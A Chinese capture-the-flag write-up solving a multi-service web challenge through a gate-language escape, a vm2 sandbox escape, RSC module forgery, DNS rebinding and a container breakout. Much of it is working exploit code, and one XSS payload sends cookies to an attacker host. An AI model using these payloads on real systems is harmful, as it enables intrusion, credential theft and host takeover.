---
title: 雾上的伊拉斯谟-Revenge（QCTF2026 web）
date: 2026-10-21
category: Web
tags:
  - CTF
  - Writeup
  - web
draft: false
summary: "Revenge 版把原题重做成了一个多服务容器，题目明确不限制 Agent，实例是动态环境，网关主机名形如："
collection: QCTF2026
---
# 雾上的伊拉斯谟-Revenge

## 第一节：题目

Revenge 版把原题重做成了一个多服务容器，题目明确不限制 Agent，实例是动态环境，网关主机名形如：

```
3000-<uuid>.challenge.ctfplus.cn
```

一个容器里跑了七个服务，用不同的 uid 隔离：

|pid|uid|服务|监听|持有的秘密|
|---|---|---|---|---|
|1|root|entrypoint.js|—|生成 ADMIN_TOKEN、ARCHIVE_KEY、SEAL_CAP、COURIER_TOKEN，把 FLAG_VALUE 只注入 docker-api|
|18|root|rebind-dns|127.0.0.1:15353 UDP|负责 rebind.test 域名解析|
|19|bot|bot/server.js|127.0.0.1:24401|Chromium 里的 ADMIN_TOKEN cookie|
|20|root|seal-mint|127.0.0.1:24374|SEAL_CAP|
|21|root|docker-api|127.0.0.1:24375|FLAG_VALUE|
|22|root|courier|127.0.0.1:8080|COURIER_TOKEN、ARCHIVE_KEY|
|23|1000|web|3000 应用 + 7777 攻击者页|COURIER_TOKEN|

应用面是 Node 写的，关键入口有 /api/gloss、/api/compose、/api/report 和 /view、/framed、/notes/add。目标是拿到 docker-api 日志里的 FLAG_VALUE。

这一版把门禁做得很硬：/api/gloss 的 forwarded 请求先过 proxy-gate-worker，只有 worker 里真的执行了 console.log(GATE_NONCE) 才算过；gate 与父进程之间的 IPC 用 V8 结构化序列化，父进程还要求 e.ok === true。也就是说，任何靠消息对象伪装的思路都不成立，必须在 gate 的受限语言里真正执行任意代码。courier 只绑 127.0.0.1，COURIER_TOKEN 在 web 启动时读入内存后就把临时文件删掉，外部拿不到 token，只能让 web 自己替我们发请求。

完整链路是：gate 逃逸 → vm2 逃逸读 proof → composeStrict 注入 multipart → RSC folio 伪造模块加载 → courier 的 DNS rebind → seal-mint 铸 cap → docker-api 建容器读日志。

## 第二节：过程

### 一、先把 gate 的语言摊开

gate 的语法是递归正则：

```
^root(?:\.\w+)*(?:\((?<inner>.*)\))?$
```

只允许 root 加成员链，或者一个成员链带一个括号参数，参数内部递归同语法。禁止逗号、空格、字符串、运算符，零参数调用非法。worker 用 wrap 包住 root：

```js
function wrap(r) {
  if (r === Function) throw new TypeError("unavailable value");
  if (r == null) return r;
  const t = new Proxy(Object(r), {
    get(e, r, t) { return wrap(Reflect.get(e, r, t)); },
    apply(e, r, t) {
      const m = t.map(unwrap);
      return wrap(Reflect.apply(e, unwrap(r), m));
    },
  });
  e.set(t, r);
  return t;
}
```

console.log 被换成 nonce 检查：只有参数等于 GATE_NONCE，ok 才会置真。gate 的语言里到不了 console、process、globalThis，Function 被显式拦截。把 wrap([]) 可达的对象图做一遍 BFS，结论是封闭的纯 ECMAScript 内建，没有 process、console、globalThis 的引用。

所以唯一的路不是在语言外面骗结果，而是在语言里面逃出去，让 worker 自己执行任意代码，读出环境变量里的 nonce，再调用真正的 console.log。

### 二、逃逸的五个台阶

语言有三座山：裸 Function 拿不到，因为 wrap 见到 r === Function 直接抛错；只能写单参数调用，语法里没有逗号；没有字符串字面量，也没有括号点和引号之外的标点。

第一步，把裸 Function 装进数组元素。wrap 只包数组本身，不包数组里的元素。Object.values(Object.getOwnPropertyDescriptor(Function.prototype, 'constructor')) 返回一个原生数组 [Function, true, false, true]，第 0 个元素就是 Function 构造器。语言里读不到 Function，但它可以坐在数组里被搬来搬去。

第二步，凭空中制造多参数调用。把 Array.prototype.map 污染成 flatMap。apply 陷阱里有一句 t.map(unwrap)，污染之后它会把数组实参摊平成多个参数。于是 AP.reduce(gopd.bind(null)) 这种写法就能把 AP 的两个元素当作两个参数传给 getOwnPropertyDescriptor。污染本身也用语言原语完成：root.reduce(Object.assign.bind(null)) 配合 fromEntries(Array.of(root)) 把 map 装成 flatMap。

第三步，造 Function.bind(null, BODY)。AP 变成 [Function, null, BODY] 之后，root.map.bind.call(AP) 摊平后就是 bind.call(Function, null, BODY)，得到 BF。

第四步，把 BF 装成 getter。Object.prototype.**defineGetter**('valueOf', BF)。

第五步，触发。Number(任意函数) 会走向 ToPrimitive，先 Get('valueOf')，getter 被零参调用，等于执行 Function(BODY)，返回目标函数；ToPrimitive 紧接着会调用这个返回值，于是 BODY 就在 worker 的全局作用域里执行了。

BODY 是：

```js
console.log(Object.values(process.env).pop())
```

这里故意不拼 GATE_NONCE。大写 G 和 T 在可达的字符串调色板里凑不出来，而 Linux 上 gate worker 的 env 只有 NODE_ENV 和 GATE_NONCE 两个变量，取 Object.values(process.env).pop() 正好就是 nonce。

生成器是 gen4.js：

```js
'use strict';
const fs = require('fs');
const BODY = process.argv[2] || 'console.log(Object.values(process.env).pop())';
const OUT = process.argv[3] || 'c4.txt';
const C = {
  call: 'root.map.call.name', bind: 'root.map.bind.name', apply: 'root.map.apply.name',
  tos: 'root.map.toString.name',
  assign: 'root.__proto__.__proto__.constructor.assign.name',
  gopd: 'root.__proto__.__proto__.constructor.getOwnPropertyDescriptor.name',
  fromE: 'root.__proto__.__proto__.constructor.fromEntries.name',
  values: 'root.__proto__.__proto__.constructor.values.name',
  unshift: 'root.unshift.name', shift: 'root.shift.name',
  valueOfN: 'root.map.valueOf.name', strCtor: 'root.map.name.constructor',
  objCtor: 'root.__proto__.__proto__.constructor', objProto: 'root.__proto__.__proto__',
  funcProto: 'root.map.__proto__', numProto: 'root.length.__proto__',
  arrCtor: 'root.constructor', empty: 'root.map.__proto__.name',
};
const N = { 0: 'root.reverse.length', 1: 'root.map.length', 2: 'root.splice.length' };
const AP = 'root.__proto__', idx = n => N[n];
const CH = {
  c: [C.call, 0], o: [C.tos, 1], n: [C.bind, 2], s: [C.assign, 1], t: [C.tos, 0],
  l: [C.call, 2], e: [C.gopd, 1], g: [C.gopd, 0], v: [C.valueOfN, 0], a: [C.assign, 0],
  u: [C.unshift, 0], p: [C.apply, 1], r: [C.fromE, 1], h: [C.shift, 1], i: [C.shift, 2],
  f: [C.shift, 3], O: [C.objCtor + '.name', 0], b: [C.objCtor + '.name', 1], j: [C.objCtor + '.name', 2],
};
const PUNCT = { '(': 0, ')': 1, '.': 2 };
function charExpr(ch, prev) {
  if (PUNCT[ch] !== undefined) return `${AP}.at(${idx(PUNCT[ch])}.valueOf(${prev}))`;
  const p = CH[ch]; if (!p) throw new Error('no palette ' + ch);
  return `${p[0]}.charAt(${idx(p[1])}.valueOf(${prev}))`;
}
// P0
const S1 = `root.push(root.flatMap)`;
const S2 = `root.push(root.map.name.valueOf(${S1}))`;
const S3 = `root.reverse(${S2})`;
const S4 = `root.push(${AP}.valueOf(${S3}))`;
const S5 = `root.push(${C.objCtor}.fromEntries(${C.arrCtor}.of(root.valueOf(${S4}))))`;
const S6 = `root.shift(${S5})`;
const S7 = `root.shift(${S6})`;
const NULLS7 = `${C.objCtor}.getPrototypeOf(${C.objProto}.valueOf(${S7}))`;
let e = `root.reduce(${C.objCtor}.assign.bind(${NULLS7}))`;

// clear root
e = `root.splice(${idx(0)}.valueOf(${e}))`;
// grow AP to 40: 12+12+9+7
const g = (protoExpr, prev) => `${AP}.push(${C.objCtor}.getOwnPropertyNames(${protoExpr}.valueOf(${prev})))`;
e = g(C.objProto, `${AP}.splice(${idx(0)}.valueOf(${e}))`);   // +12
e = g(C.objProto, e);                                          // +12 = 24
e = g(C.funcProto, e);                                         // +9  = 33
e = `${AP}.push(${C.objCtor}.getOwnPropertyNames(${C.objCtor}.getPrototypeOf(root.length.valueOf(${e}))))`; // +7 = 40
// stash '(' ')' '.' into root
e = `root.push(${C.strCtor}.fromCharCode(${e}))`;              // 40 -> '('
e = `${AP}.push(${idx(1)}.valueOf(${e}))`;                     // 41
e = `root.push(${C.strCtor}.fromCharCode(${e}))`;              // -> ')'
for (let i = 0; i < 5; i++) e = `${AP}.push(${idx(1)}.valueOf(${e}))`; // 46
e = `root.push(${C.strCtor}.fromCharCode(${e}))`;              // -> '.'
e = `${AP}.splice(${idx(0)}.valueOf(${e}))`;                   // clear AP
e = `root.reverse(${e})`;                                      // root = ['.',')','(']
e = `${AP}.push(root.pop(${e}))`;                              // '('
e = `${AP}.push(root.pop(${e}))`;                              // ')'
e = `${AP}.push(root.pop(${e}))`;                              // '.'

// body into root
for (const ch of BODY) e = `root.push(${charExpr(ch, e)})`;
e = `root.push(root.join(${C.empty}.valueOf(${e})))`;          // BODYSTR onto root

// key into AP
e = `${AP}.splice(${idx(0)}.valueOf(${e}))`;
for (const ch of 'constructor') e = `${AP}.push(${charExpr(ch, e)})`;
e = `root.push(${AP}.join(${C.empty}.valueOf(${e})))`;         // KEYSTR onto root

// descriptor via reduce(gopd.bind(null))
const clearV = `${AP}.splice(${idx(0)}.valueOf(${e}))`;
const pushProto = `${AP}.push(${C.funcProto}.valueOf(${clearV}))`;
const pushKey = `${AP}.push(root.pop(${pushProto}))`;
const nullV = `${C.objCtor}.getPrototypeOf(${C.objProto}.valueOf(${pushKey}))`;
const gopdBound = `${C.objCtor}.getOwnPropertyDescriptor.bind(${nullV})`;
const desc = `${AP}.reduce(${gopdBound})`;
e = `${AP}.push(${C.objCtor}.values(${desc}))`;                // V spread -> [funcProto,KEY,Function,true,false,true]
for (let i = 0; i < 3; i++) e = `${AP}.pop(${e})`;             // [funcProto,KEY,Function]
e = `${AP}.shift(${AP}.shift(${e}))`;                          // [Function]
e = `${AP}.push(${C.objCtor}.getPrototypeOf(${C.objProto}.valueOf(${e})))`;
e = `${AP}.push(root.pop(${e}))`;                              // BODYSTR onto AP

// BF and accessor
const seqKey = `root.push(${C.valueOfN}.valueOf(root.splice(${idx(0)}.valueOf(${e}))))`;
const bf = `root.map.bind.call(${AP}.valueOf(${seqKey}))`;
e = `root.push(${bf})`;
e = `${C.objProto}.__defineGetter__(root.valueOf(${e}))`;
e = `root.length.constructor(root.map.valueOf(${e}))`;

function valid(s) { const r = /^root(?:\.\w+)*(?:\((?<inner>.*)\))?$/s.exec(s); if (!r) return false; const i = r.groups.inner; return i === undefined || valid(i); }
console.log('BODY=%j len=%d expr=%d grammar=%s', BODY, BODY.length, e.length, valid(e));
fs.writeFileSync(__dirname + '/' + OUT, e);
```

生成的最终 gate code 是 6926 字节，grammar 校验通过，sha256 为 594c19e2 开头。远端 oracle 返回 HTTP 400 而不是 403 或 422，说明 gate 已经过了。

### 三、拿到每次请求的 proof

gate 之后是 /api/gloss 的 vm2 沙箱。容器里装的是 vm2 3.11.5 和 Node 26.7.0，正好落在 GHSA-27g9-p43v-cw3v 的范围内，编号 CVE-2026-92944。漏洞在 Promise 的 species 查找链上，配合栈溢出可以把宿主 realm 的 RangeError 送回沙箱，再用 ex.constructor.constructor 拿到宿主 Function。

载荷：

```js
const done = Promise.withResolvers();
class E extends Error {}
function so(d) { if (d > 0) so(d - 1); const e = new E(); e.stack; throw e; }
let ex;
function doFinally(f) {
  ex = undefined;
  const p = Promise.withResolvers();
  const ct = function (executor) { executor(f, v => { ex = v; p.resolve(); }); };
  const q = (async () => 1)();
  Object.defineProperty(q, 'constructor', { value: { [Symbol.species]: ct }, configurable: true });
  q.finally(() => {});
  return p.promise;
}
(async function f(s) {
  let min = s, max = 200000, steps = 0;
  while (min < max && steps++ < 40) {
    const mid = (min + max) >> 1;
    await doFinally(() => so(mid));
    if (ex && ex.name === 'RangeError' && !(ex instanceof RangeError)) {
      const P = ex.constructor.constructor('return process')();
      done.resolve('HOST v=' + P.version + ' cwd=' + P.cwd());
      return;
    }
    if (ex instanceof E) min = mid + 1; else max = mid;
  }
  if (s < 32) { f(s + 1); } else { done.resolve('nohit'); }
})(0);
return done.promise;
```

逃逸之后读 process.env.GLOSS_PROOF，把 proof 和 vars 一起 JSON.stringify 返回：

```js
function makec(P) { return JSON.stringify({ proof: P.env.GLOSS_PROOF, vars: input.vars }); }
```

### 四、把 multipart 塞进 composeStrict

composeStrict 是模板引擎，变量替换可以嵌套。我们用 vars 链把 %name% 一路引到 longVarName，longVarName 的值经 rot47 变成一段含 run 命令的文本，把整段 multipart 正文塞进 run 的参数里：

```
name       = <<%n1%
n1         = %n2%
n2         = \\%n3%
n3         = %n4%
n4         = strrot(%
longVarName= rot47("\"/><\run('" + ARG + "');unsafe/>")
```

ARG 是一整份 multipart 正文。字符串里有几个字符必须清掉：单引号会截断 run 的参数，/> 会截断命令，两个以上的 % 会被变量正则抢走，大写 V 经 rot47 会变成单引号被 stripQuotes 删掉，大写 T 会变成 %。RSC 的字段都是 JSON 文本，chunk-reviver 会先 JSON.parse，所以这些字符统一写成 JSON 的转义形式，也就是反斜杠加 u0027、u0054、u0056、u0025、u002f，就能安全穿过。

### 五、RSC folio 解码器伪造

chunk-reviver 的 $F 分支在解析 outlined model 时会做：

```js
o = Object.assign(Object.create(null), e, l._response)
```

攻击者对象里的 _response._bundlerConfig 会覆盖解码器自己的配置。白名单检查的是我们提供的配置条目，所以伪造 {id:"node:util",name:"format"} 和 {id:"node:child_process",name:"execSync"} 就能让 Module._load 返回真实的模块。

assembleFolio 要求 stamp、origin、path、methods、flags、body、form、lineage、handler、fn、cyc 全部齐备，我们按解码器的每个 $ 类型逐个构造。selectForwardTarget 的 manifest 也来自我们的根对象，origin 必须是 http、无 userinfo、pathname 为 /、无 search 和 hash，path 可以带 query。origin 用 rebind 域名，因为 courier 对数字 IP 直接拒绝。

### 六、courier 和内部服务

courier 的 /fetch 只认 Bearer COURIER_TOKEN，对 URL 做两次 DNS 解析：第一次用 firstHopGuard 挡内网，第二次才连接；连接目标是 127.0.0.1 且端口在 24374、24375 时自动附加 X-Courier-Auth: ARCHIVE_KEY。rebind-dns 按查询次数奇偶轮流返回两个 IP，域名格式是 make--rebind-.rebind.test，点写成横线。

ADMIN_TOKEN 在 bot 的 cookie 里，用 folios 的 split 加 sort mXSS 拿到。构造一条 note：

```
<img src="|abc">|A" onerror=fetch('http://attacker.test:7777/leak/<id>?c='+encodeURIComponent(document.cookie)) x="
```

/notes/add 先净化，/view 再按 | split 后 sort 再 join，排序会把同一标签的片段重排成带 onerror 的 img。投递链是三条 popup：先打开 /notes/add 写 cookie，再打开 /framed?html=proof 让 framed.js 以 From-Fetch: 1 预取 /view 并进入私有缓存，最后把 popup 导航到 /view?html=proof 命中缓存，脚本在顶层文档执行。报告回读里拿到 ADMIN_TOKEN。

四段 forwarded gloss 分别打 mint、create、start、logs。驱动脚本是 n2_chain.py：

```python
#!/usr/bin/env python3
"""Full chain: gate -> composed folio -> courier -> seal-mint/docker-api."""
import json, subprocess, sys, os, urllib.request, urllib.error

H = "http://3000-01939323-7eeb-4f35-92c0-92409a41be5c.challenge.ctfplus.cn"
ADMIN = "d99aa2603bd94b5ffe15173018c0376fd522fca62776a0d5"
REBIND = "make-1-1-1-1-rebind-127-0-0-1-rr.rebind.test"

ESC_PRE = r'''
const done = Promise.withResolvers();
class E extends Error {}
function so(d) { if (d > 0) so(d - 1); const e = new E(); e.stack; throw e; }
let ex;
function doFinally(f) {
  ex = undefined;
  const p = Promise.withResolvers();
  const ct = function (executor) { executor(f, v => { ex = v; p.resolve(); }); };
  const q = (async () => 1)();
  Object.defineProperty(q, 'constructor', { value: { [Symbol.species]: ct }, configurable: true });
  q.finally(() => {});
  return p.promise;
}
function makec(P) { return JSON.stringify({ proof: P.env.GLOSS_PROOF, vars: input.vars }); }
'''
ESC_SUF = r'''
(async function f(s) {
  let min = s, max = 200000, steps = 0;
  while (min < max && steps++ < 40) {
    const mid = (min + max) >> 1;
    await doFinally(() => so(mid));
    if (ex && ex.name === 'RangeError' && !(ex instanceof RangeError)) {
      const P = ex.constructor.constructor('return process')();
      done.resolve(makec(P));
      return;
    }
    if (ex instanceof E) min = mid + 1; else max = mid;
  }
  if (s < 32) { f(s + 1); } else { done.resolve('nohit'); }
})(1);
return await done.promise;
'''

def sh(args, inp=None):
    return subprocess.run(args, capture_output=True, input=inp, cwd=os.getcwd())

def build_vars(origin, path, method, payload, boundary="FOLIO20261018fixed"):
    body = sh(["node", "f4/f4_build.js",
               "--origin=" + origin, "--path=" + path,
               "--method=" + method, "--payload=" + json.dumps(payload),
               "--boundary=" + boundary]).stdout.decode("utf-8")
    if not body:
        raise SystemExit("f4_build produced no body")
    # rot47 会把大写 T/V 变成 % 和单引号，JSON 里改写成转义
    bs = chr(92)
    san = body.replace("T", bs + "u0054").replace("V", bs + "u0056")
    open("n2_arg.txt", "w", encoding="utf-8", newline="").write(san)
    sh(["node", "t4/dumpvars.js", "n2_arg.txt", "n2_vars.json"])
    return json.load(open("n2_vars.json", encoding="utf-8"))

def gloss(gate, vars_obj, timeout=45):
    body = {"annotation": "x",
            "input": {"vars": vars_obj},
            "renderer": ESC_PRE + ESC_SUF,
            "marginalia": gate, "forwarded": True, "action": "1a2b"}
    req = urllib.request.Request(H + "/api/gloss", data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)

def step(gate, name, origin, path, method, payload):
    vars_obj = build_vars(origin, path, method, payload)
    st, out = gloss(gate, vars_obj)
    print("== %s HTTP %s" % (name, st))
    print(out[:1500])
    return st, out

def main():
    gate = open(sys.argv[1], encoding="utf-8").read().strip()
    admin = sys.argv[3] if len(sys.argv) > 3 and sys.argv[2] == "--admin" else ADMIN
    st, out = step(gate, "mint", "http://%s:24374" % REBIND,
                   "/mint?action=create&admin=" + admin, "GET", {})
    inner = json.loads(out)["result"]
    cap = json.loads(inner)["cap"]
    st, out = step(gate, "create", "http://%s:24375" % REBIND,
                   "/containers/create?cap=" + cap, "POST",
                   {"Cmd": ["/host/readflag"], "HostConfig": {"Binds": ["/:/host"]}})
    cid = json.loads(json.loads(out)["result"])["Id"]
    step(gate, "start", "http://%s:24375" % REBIND, "/containers/%s/start" % cid, "POST", {})
    st, out = step(gate, "logs", "http://%s:24375" % REBIND, "/containers/%s/logs" % cid, "GET", {})
    print("FINAL:", out[:800])

if __name__ == "__main__":
    main()
```

工程上踩过的一个坑：Python subprocess 的 text=True 会把 CRLF 转成 LF，multipart 的头部直接坏掉，resolve 只能解出 1。必须按字节读，保留 \r\n。

四步跑完，docker-api 的 logs 返回：

```
flag{39596be1-a2ea-4c15-9c7e-0c54e9d2ea1b}
```